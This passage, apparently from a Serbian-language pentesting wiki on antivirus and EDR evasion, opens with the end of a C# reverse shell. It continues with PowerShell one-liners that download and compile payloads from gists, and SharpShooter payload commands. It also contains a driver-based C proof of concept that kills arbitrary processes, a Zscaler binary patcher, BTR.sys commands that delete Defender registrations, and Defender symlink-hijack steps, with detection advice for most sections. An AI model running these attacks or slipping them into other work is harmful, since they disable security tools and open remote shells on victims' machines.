					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# korišćenjem kompajlera

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista C# obfuskatora: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Primer korišćenja pythona za pravljenje injectora:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Više

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Uništavanje AV/EDR-a iz Kernel Space-a

Storm-2603 je iskoristio mali konzolni uslužni program poznat kao **Antivirus Terminator** da onemogući zaštitu krajnjih tačaka pre isporuke ransomware-a. Alat donosi **sopstveni ranjivi, ali *potpisani* drajver** i zloupotrebljava ga za izvršavanje privilegovanih operacija u kernelu koje ne mogu da blokiraju čak ni AV servisi sa zaštitom Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Ključni zaključci
1. **Potpisani drajver**: Datoteka isporučena na disk zove se `ServiceMouse.sys`, ali binarna datoteka je legitimno potpisani drajver `AToolsKrnl64.sys` iz paketa „System In-Depth Analysis Toolkit“ kompanije Antiy Labs. Pošto drajver ima važeći Microsoft potpis, učitava se čak i kada je omogućena opcija Driver-Signature-Enforcement (DSE).
2. **Instalacija servisa**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Prva linija registruje drajver kao **kernel servis**, a druga ga pokreće, čime `\\.\ServiceMouse` postaje dostupan iz korisničkog prostora.
3. **IOCTL-ovi koje drajver izlaže**
   | IOCTL kod | Mogućnost                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Prekinuti proizvoljan proces pomoću PID-a (koristi se za gašenje Defender/EDR servisa) |
   | `0x990000D0` | Obrisati proizvoljnu datoteku sa diska |
   | `0x990001D0` | Ukloniti drajver i servis |

   Minimalni C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Zašto funkcioniše**: BYOVD u potpunosti zaobilazi zaštite u korisničkom režimu; kod koji se izvršava u kernelu može da otvori *zaštićene* procese, da ih prekine ili da menja kernel objekte, bez obzira na PPL/PP, ELAM ili druge funkcije za ojačavanje zaštite.

Otkrivanje / ublažavanje
•  Omogućite Microsoftovu listu blokiranih ranjivih upravljačkih programa (`HVCI`, `Smart App Control`) kako bi Windows odbijao učitavanje datoteke `AToolsKrnl64.sys`.
•  Nadgledajte kreiranje novih *kernel* servisa i upozorite kada se upravljački program učita iz direktorijuma u koji svi mogu da upisuju ili kada nije na listi dozvoljenih.
•  Pratite ručke iz korisničkog režima ka prilagođenim objektima uređaja, a zatim i sumnjive pozive `DeviceIoControl`.

### Zaobilaženje provera položaja uređaja u Zscaler Client Connector-u zakrpavanjem binarnih datoteka na disku

Zscaler-ov **Client Connector** lokalno primenjuje pravila za položaj uređaja i oslanja se na Windows RPC za prosleđivanje rezultata drugim komponentama. Dva slaba izbora u dizajnu omogućavaju potpuno zaobilaženje:

1. Provera položaja uređaja se odvija **u potpunosti na klijentu** (serveru se šalje logička vrednost).
2. Interni RPC endpoints proveravaju samo da li je izvršna datoteka koja se povezuje **potpisana od strane Zscaler-a** (pomoću `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Zakrpavanjem četiri potpisane binarne datoteke na disku** moguće je neutralisati oba mehanizma:

| Binarna datoteka | Izvorna logika koja se zakrpljuje | Rezultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1`, pa je svaka provera usklađena |
| `ZSAService.exe` | Indirektni poziv funkcije `WinVerifyTrust` | NOP-ed ⇒ svaki proces (čak i nepotpisan) može da se poveže cu RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Provere integriteta tunela | Zaobiđene |

Minimalni izvod patcher-a:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nakon zamene originalnih datoteka i ponovnog pokretanja servisnog steka:

* **Sve** provere bezbednosnog stanja prikazuju **zeleno/usaglašeno**.
* Nepotpisani ili izmenjeni binarni fajlovi mogu da otvore RPC krajnje tačke imenovanih cevi (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup internoj mreži definisanoj Zscaler pravilima.

Ova studija slučaja pokazuje kako se odluke o poverenju donete isključivo na klijentskoj strani i jednostavne provere potpisa mogu zaobići sa nekoliko izmena bajtova.

## Zloupotreba pouzdane funkcionalnosti Microsoft Defender `BTR.sys`

Defender-ov drajver **Boot-Time Removal** koristan je kontraprimer klasičnom BYOVD-u. `BTR.sys` je legitimna Microsoft-ova komponenta za sanaciju sa potpisom, bez greške korupcije memorije i bez IOCTL interfejsa; nakon sticanja administratorskog pristupa i privilegije `SeLoadDriverPrivilege`, operater umesto toga može da falsifikuje njegovu privatnu transakciju sanacije i dobije pristup predviđenim operacijama nad datotekama/registrom u Ring-0. Ovo je **primitiv za neutralisanje AV/EDR-a nakon kompromitovanja, a ne za početni pristup ili eskalaciju privilegija**, a drajver se može izdvojiti iz resursa `BOOTTIMETOOL` u sopственом `MpEngine.dll` ciljnog sistema, umesto da se uvozi upadljiv drajver treće strane.<sup>[[36]](#references)</sup>

### Priprema jednokratnog drajvera

Defender obično zapisuje resurs kao nasumično imenovanu datoteku `[a-z]{8}.sys` i registruje kernel servis sa sličnim imenom. `DriverEntry` čita vrednost `Args` servisa, otvara referencirani NTFS ADS, dešifruje i proverava listu radnji, zapisuje povratne informacije i vraća `0xC0000056` (`STATUS_DELETE_PENDING`) nakon uspešnog izvršavanja, tako da se drajver uklanja umesto da ostane učitan. Falsifikovani servis ima sledeće karakteristične vrednosti.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Tok `:changelist` sadrži jedan blob šifrovan pomoću RC4. Analizirane verzije ponovo koriste fiksni ključ od 256 bajtova, tako da šifrovanje nije granica autorizacije. Ispravan plaintext sadrži globalno zaglavlje od 24 bajta (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC zaglavlja i ID transakcije izveden iz payload-a), zatim null-terminiranu UTF-16 putanju za povratne informacije i proizvoljan broj stavki. Svaka stavka ima zaglavlje od 16 bajtova (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) i podatke specifične za akciju koji se završavaju sa **tačno četiri NUL bajta**. Svako zaglavlje i oblast podataka proveravaju se zasebno pomoću CRC-32 polinoma `0xEDB88320`, početnog stanja `0xFFFFFFFF` i **bez završnog XOR-a** (`~CRC32`); CRC stanje se resetuje za svaku oblast.<sup>[[36]](#references)[[37]](#references)</sup>

Prihvaćeni ID-jevi akcija otkrivaju ove primitive kernela.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Podaci stavke | Rezultat |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Brisanje datoteke, uključujući zaključanu datoteku |
| 2 | `[UTF-16 path]` | Uklanjanje praznog direktorijuma |
| 3 | `[Flags][source][destination]` | Premeštanje datoteke na zaštićenu putanju koju je izabrao napadač; prazno odredište znači brisanje |
| 4 | `[Flags][key path]` | Rekurzivno brisanje ključa registratora |
| 5 | `[Flags][key path + "\\" + value]` | Brisanje vrednosti registratora |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Kreiranje/ažuriranje vrednosti registratora i kreiranje nedostajućih putanja ključeva |

Za akcije 5 i 6, separator ključa/vrednosti u serijalizovanom formatu čine **dve uzastopne obrnute kose crte**; putanja zapisana u uobičajenom formatu neće biti pravilno razdvojena. Datoteka za povratne informacije uglavnom preslikava zahtev, ali prva četiri bajta podataka svake stavke postaju njen rezultat `NTSTATUS`. Kod akcija 1 i 2, koje nemaju polje zastavica na početku, BTR premešta putanju u četiri rezervisana završna bajta kako bi napravio prostor za taj status.<sup>[[36]](#references)</sup>

### Tok rada `BTR_CLI` i prozor ranog pokretanja

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementira ceo lanac: izdvaja `BTR.sys` iz lokalnog Defender-a, kreira `<random>.sys:changelist` i tok za povratne informacije, serijalizuje/poprilično proverava/šifruje ulančane akcije, direktno kreira ključ registratora servisa, a zatim poziva `NtLoadDriver` za `-trigger now` ili ga ostavlja kao drajver koji se pokreće pri startu sistema za `-trigger boot`. Direktno postavljanje u registratoru zaobilazi uobičajeni SCM put `CreateServiceW` i zato **ne generiše** Event ID 7045 za instalaciju servisa. Artefakti pokrenuti pri startovanju sistema mogu se kasnije ukloniti pomoću `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` nije upotrebljiv jer BTR obavlja I/O nad datotekama iz `DriverEntry` pre nego što stek za skladištenje i veza `SystemRoot` budu spremni. `Start=1` uz grupu visokog prioriteta `Boot Bus Extender` umesto toga omogućava izvršavanje u fazi 1: NTFS je upotrebljiv, ali mnogi bezbednosni drajveri koji se pokreću pri startovanju sistema i EDR servisi u korisničkom režimu još nisu inicijalizovani. Filteri koji se pokreću pri startovanju, kao što je `WdFilter`, možda su već učitani, ali BTR može da ukloni njihove binarne datoteke ili konfiguraciju servisa pre sledećeg pokretanja i može da obriše izvršne datoteke servisa pre nego što ih SCM pokrene. ELAM ne zatvara ovaj jaz jer se BTR pokreće nakon procene drajvera koji se pokreću pri startovanju i ima važeći Microsoft potpis.<sup>[[36]](#references)</sup>

Više radnji se izvršava u jednoj transakciji. PoC dodaje Radnju 1 na početak za unapred zadatu putanju `\SystemRoot\Temp\BootClean.log`: BTR kreira ovaj log, zatim izvršava sopstveni zahtev za brisanje i uklanja ga pre isključivanja. Time se smanjuje količina dokaza, a smeštanje povratnih informacija u `<random>.sys:<random>.dat` omogućava zajedničko uklanjanje drajvera i oba toka.<sup>[[36]](#references)[[37]](#references)</sup>

### Korelacije za detekciju visokog značaja

Pravila zasnovana samo na potpisima i Microsoft-ova lista blokiranih ranjivih drajvera ne rešavaju zloupotrebu predviđene BTR funkcionalnosti. Prednost dajte ovim korelacijama ponašanja, uz razlikovanje legitimnog Defender porekla od proizvoljnog pokretača.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Kreiranje `.sys:changelist` je uобичајено за BTR staging. ADS `.dat` povezan sa istim `.sys` fajlom posebno je sumnjiv jer legitimni Defender obično smešta povratne informacije u `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bez System 7045:** Povežite direktno kreiranje `HKLM\SYSTEM\CurrentControlSet\Services\<random>` koje sadrži `Args=...:changelist` i `Group=Boot Bus Extender` sa izostankom odgovarajućeg SCM instalacionog događaja.
- **Sysmon 6 -> 23:** Povežite učitavanje poznatog BTR drajvera koji nije potekao od Defendera sa naknadnim brisanjem datoteka koje je izvršio `System`/PID 4, naročito kada su u pitanju bezbednosne binarne datoteke.
- **Sysmon 11 -> 23:** Generišite upozorenje na brzo kreiranje i brisanje datoteke `\SystemRoot\Temp\BootClean.log` od strane `System`/PID 4.
- Ograničite i nadgledajte dodelu/omogućavanje privilegije `SeLoadDriverPrivilege`; sam Microsoft potpis nije dovoljan razlog za poverenje kada bezbednosni alat postavlja drajver pomoću `cmd.exe`, PowerShell-a ili nepoznatog procesa.

## Zloupotreba Protected Process Light (PPL) za neovlašćeno menjanje AV/EDR-a pomoću LOLBIN-ova

Protected Process Light (PPL) sprovodi hijerarhiju potpisnika/nivoa, tako da samo zaštićeni procesi istog ili višeg nivoa mogu da menjaju jedni druge. U napadu, ako možete legitimno da pokrenete binarnu datoteku sa omogućenim PPL-om i kontrolišete njene argumente, možete da iskoristite benignu funkcionalnost (npr. logovanje) kao ograničeni mehanizam za upis, zaštićen PPL-om, u zaštićene direktorijume koje koriste AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Šta omogućava da se proces pokrene kao PPL
- Ciljni EXE (i sve učitane DLL datoteke) mora biti potpisan EKU-om koji podržava PPL.
- Proces mora biti kreiran pomoću CreateProcess i sledećih zastavica: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Mora se zatražiti kompatibilan nivo zaštite koji odgovara potpisniku binarne datoteke (npr. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` za potpisnike anti-malware softvera, `PROTECTION_LEVEL_WINDOWS` za Windows potpisnike). Pogrešan nivo dovešće do neuspešnog kreiranja.

Ovde pogledajte i širi uvod u PP/PPL i LSASS zaštitu:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Alati za pokretanje
- Pomoćni alat otvorenog koda: CreateProcessAsPPL (bira nivo zaštite i prosleđuje argumente ciljnom EXE-u):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Obrazac korišćenja:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Potpisani sistemski binarni fajl `C:\Windows\System32\ClipUp.exe` pokreće sopstveni proces i prihvata parametar za upisivanje log fajla na putanju koju navede pozivalac.
- Kada se pokrene kao PPL proces, upisivanje fajla se obavlja uz PPL podršku.
- ClipUp ne može da obrađuje putanje koje sadrže razmake; koristite kratke 8.3 putanje za pristup uobičajeno zaštićenim lokacijama.

Pomoćni alati za kratke 8.3 putanje
- Prikazivanje kratkih naziva: `dir /x` u svakom nadređenom direktorijumu.
- Izvođenje kratke putanje u cmd-u: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Lanac zloupotrebe (apstraktan)
1) Pokrenite LOLBIN koji podržava PPL (ClipUp) sa `CREATE_PROTECTED_PROCESS` koristeći pokretač (npr. CreateProcessAsPPL).
2) Prosledite argument za putanju ClipUp log fajla da biste primorali kreiranje fajla u zaštićenom AV direktorijumu (npr. Defender Platform). Po potrebi koristite kratke 8.3 nazive.
3) Ako AV obično otvara/zaključava ciljnu binarnu datoteku dok radi (npr. MsMpEng.exe), zakažite upisivanje pri pokretanju sistema, pre nego što se AV pokrene, tako što ćete instalirati uslugu za automatsko pokretanje koja se pouzdano pokreće ranije. Proverite redosled pokretanja pomoću Process Monitor-a (evidentiranje pokretanja sistema).
4) Pri ponovnom pokretanju, upisivanje uz PPL podršku obavlja se pre nego što AV zaključa svoje binarne datoteke, oštećujući ciljnu datoteku i sprečavajući pokretanje.

Primer poziva (putanje su izostavljene/skraćene iz bezbednosnih razloga):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Napomene i ograničenja
- Ne možete da kontrolišete sadržaj koji ClipUp upisuje, već samo mesto upisa; ova primitiva je pogodna za korupciju, a ne za precizno ubacivanje sadržaja.
- Potrebne su lokalne administratorske/SYSTEM privilegije za instaliranje/pokretanje servisa, kao i period tokom kog je moguće ponovo pokrenuti sistem.
- Vreme izvršavanja je ključno: ciljna datoteka ne sme biti otvorena; izvršavanje pri pokretanju sistema izbegava zaključavanje datoteke.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neuobičajenim argumentima, naročito ako ga pokreću nestandardni launcher-i, u vreme pokretanja sistema.
- Novi servisi podešeni za automatsko pokretanje sumnjivih binarnih datoteka koji se dosledno pokreću pre Defendera/AV-a. Istražite kreiranje/izmenu servisa pre otkaza pri pokretanju Defendera.
- Praćenje integriteta datoteka za binarne datoteke i direktorijume Platform programa Defender; neočekivano kreiranje/izmena datoteka od strane procesa sa oznakama zaštićenog procesa.
- ETW/EDR telemetrija: tražite procese kreirane sa `CREATE_PROTECTED_PROCESS` i anomalnu upotrebu PPL nivoa u procesima koji nisu povezani sa AV-om.

Ublažavanje
- WDAC/Code Integrity: ograničite koje potpisane binarne datoteke mogu da se pokreću kao PPL i pod kojim roditeljskim procesima; blokirajte pozivanje ClipUp-a izvan legitimnih konteksta.
- Higijena servisa: ograničite kreiranje/izmenu servisa koji se automatski pokreću i nadgledajte manipulisanje redosledom pokretanja.
- Uverite se da su uključene Defender zaštita od neovlašćenih izmena i zaštite pri ranom pokretanju; istražite greške pri pokretanju koje ukazuju na oštećenje binarnih datoteka.
- Razmotrite onemogućavanje generisanja kratkih naziva 8.3 na volumenima na kojima se nalaze bezbednosni alati, ako je to kompatibilno sa vašim okruženjem (temeljno testirajte).

## Neovlašćena izmena Microsoft Defendera putem otmice simboličke veze do fascikle verzije platforme

Windows Defender bira platformu sa koje se pokreće tako što nabraja podfascikle u:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Bira podfasciklu sa leksikografski najvećim tekstualnim nizom verzije (npr. `4.18.25070.5-0`), a zatim odatle pokreće procese Defender servisa (uz ažuriranje putanja servisa/registra). Ovaj odabir veruje unosima direktorijuma, uključujući tačke za ponovnu analizu direktorijuma (simboličke veze). Administrator može to da iskoristi za preusmeravanje Defendera na putanju u koju napadač može da upisuje, što omogućava DLL sideloading ili ometanje servisa.<sup>[[21]](#references)[[22]](#references)</sup>

Preduslovi
- Lokalni Administrator (potreban za kreiranje direktorijuma/simboličkih veza u fascikli Platform)
- Mogućnost ponovnog pokretanja sistema ili pokretanja ponovnog odabira platforme Defendera (ponovno pokretanje servisa pri pokretanju sistema)
- Potrebni su samo ugrađeni alati (`mklink`)

Zašto funkcioniše
- Defender blokira upisivanje u svoje fascikle, ali njegov odabir platforme veruje unosima direktorijuma i bira leksikografski najveću verziju, ne proveravajući da li odredište vodi do zaštićene/pouzdane putanje.

Korak po korak (primer)
1) Pripremite upisivu kopiju trenutne fascikle platforme, npr. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Kreirajte simboličku vezu direktorijuma sa višom verzijom unutar Platform koja pokazuje na vašu fasciklu:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Izbor okidača (preporučuje se ponovno pokretanje):
```cmd
shutdown /r /t 0
```
4) Proverite da li se MsMpEng.exe (WinDefend) pokreće sa preusmerene putanje:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Trebalo bi da uočite putanju novog procesa pod `C:\TMP\AV\` i konfiguraciju usluge/registar koji ukazuju na tu lokaciju.

Opcije nakon eksploatacije
- DLL sideloading/izvršavanje koda: Postavite/zamenite DLL-ove koje Defender učitava iz direktorijuma svoje aplikacije da biste izvršili kod u Defenderovim procesima. Pogledajte odeljak iznad: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Gašenje usluge/uskraćivanje usluge: Uklonite simboličku vezu verzije kako se konfigurisana putanja ne bi razrešila pri sledećem pokretanju, pa Defender neće moći da se pokrene:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Imajte na umu da ova tehnika sama po sebi ne omogućava eskalaciju privilegija; potrebna su administratorska prava.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red timovi mogu da premeste runtime evasion iz C2 implanta u sam ciljni modul tako što zakače njegovu Import Address Table (IAT) i usmere odabrane API-je kroz napadačev position-independent code (PIC). Ovim se evasion proširuje izvan malog skupa API-ja koje mnogi kitovi izlažu (npr. CreateProcessA), a iste zaštite primenjuju se i na BOF-ove i post-exploitation DLL-ove.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Pristup na visokom nivou
- Postavite PIC blob uz ciljni modul pomoću reflective loader-a (ispred modula ili kao prateću datoteku). PIC mora biti samostalan i poziciono nezavisan.
- Dok se host DLL učitava, prođite kroz njegov IMAGE_IMPORT_DESCRIPTOR i zakrpite IAT unose za ciljane importe (npr. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) tako da upućuju na tanke PIC omotače.
- Svaki PIC omotač izvršava evasion tehnike pre poziva stvarnog API-ja. Tipične tehnike obuhvataju:
  - Maskiranje/uklanjanje maske memorije oko poziva (npr. šifrovanje beacon regiona, RWX→RX, promena naziva/ovlašćenja stranica), a zatim vraćanje stanja nakon poziva.
  - Call-stack spoofing: napravite benigni stek i pređite u ciljni API tako da analiza call stack-a prepozna očekivane frejmove.<sup>[[9]](#references)</sup>
- Radi kompatibilnosti, izložite interfejs koji omogućava Aggressor skripti (ili ekvivalentu) da registruje API-je za zakačivanje za Beacon, BOF-ove i post-exploitation DLL-ove.

Zašto ovde koristiti IAT hooking
- Radi sa svakim kodom koji koristi zakačeni import, bez izmene koda alata i bez oslanjanja na Beacon da posreduje u pozivanju određenih API-ja.
- Pokriva post-ex DLL-ove: zakačivanje LoadLibrary* omogućava presretanje učitavanja modula (npr. System.Management.Automation.dll, clr.dll) i primenu istih tehnika maskiranja/izbegavanja analize steka na njihove API pozive.
- Vraća pouzdano korišćenje post-ex komandi koje pokreću procese u okruženjima sa detekcijom zasnovanom na call stack-u, tako što obmotava CreateProcessA/W.

Minimalni nacrt IAT hook-a (x64 C/C++ pseudokod)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Napomene
- Primeni patch nakon relocations/ASLR, a pre prve upotrebe importa. Reflective loaders poput TitanLdr/AceLdr demonstriraju hooking tokom DllMain-a učitanog modula.
- Wrapper-i neka budu mali i bezbedni za PIC; pravu API funkciju razreši pomoću originalne IAT vrednosti koju si sačuvao pre patchovanja ili preko LdrGetProcedureAddress.
- Za PIC koristi RW → RX prelaze i izbegavaj stranice koje su istovremeno writable i executable.

Stub za call-stack spoofing
- PIC stub-ovi u Draugr stilu prave lažni call chain (povratne adrese unutar benignih modula), a zatim prelaze na pravu API funkciju.
- Ovo zaobilazi detekcije koje očekuju kanonske stack-ove od Beacon/BOFs-a pri pozivima osetljivih API funkcija.
- Kombinuj sa tehnikama stack cutting/stack stitching kako bi se izvršavanje smestilo unutar očekivanih frame-ova pre API prologa.

Operativna integracija
- Dodaj reflective loader na početak post-ex DLL-ova kako bi se PIC i hooks automatski inicijalizovali pri učitavanju DLL-a.
- Koristi Aggressor skriptu za registrovanje ciljnih API funkcija kako bi Beacon i BOFs transparentno koristili isti evasion path bez izmena koda.

Razmatranja za detekciju/DFIR
- IAT integritet: stavke koje razrešavaju adrese koje nisu u image memoriji (heap/anon); periodična provera import pointer-a.
- Stack anomalije: povratne adrese koje ne pripadaju učitanim image-ovima; nagli prelazi na PIC koji nije u image memoriji; nedosledno poreklo RtlUserThreadStart.
- Loader telemetrija: upisivanja u IAT unutar procesa, rana aktivnost DllMain-a koja menja import thunk-ove, neočekivani RX region-i nastali pri učitavanju.
- Zaobilaženje image-load detekcije: ako hook-uješ LoadLibrary*, prati sumnjiva učitavanja automation/clr assembly-ja povezana sa događajima maskiranja memorije.
